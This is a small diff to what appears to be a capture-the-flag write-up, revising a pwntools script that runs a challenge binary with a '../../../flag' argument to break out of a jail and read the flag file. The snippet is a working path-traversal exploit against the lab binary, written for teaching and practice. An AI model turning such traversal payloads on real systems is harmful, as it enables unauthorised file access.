@@ -76,13 +76,12 @@ Because the CWD is outside the jail, relative paths like `../` are resolved rela
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # We pass a relative path containing multiple '../' to traverse out of the jail
 # and reach the real flag file.
 payload = "../../../flag"
 
-p = process([exe, payload])
+p = process([elf.path, payload])
 print(p.recvall().decode())
 ```
